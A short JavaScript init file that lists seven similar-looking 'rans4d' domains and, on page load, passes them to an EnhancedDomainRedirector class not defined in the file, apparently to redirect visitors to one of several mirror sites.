// init.js
const securedomains = [
    'https://rans4d388.uk',
    'https://rans4d389.uk',
    'https://rans4d789.com',
    'https://rans4d889.com',
    'https://rans4djuara.org',
    'https://rans4d-vita.com',
    'https://rans4d989.com'
];

document.addEventListener('DOMContentLoaded', () => {
    const redirector = new EnhancedDomainRedirector(securedomains);
    redirector.init();
});
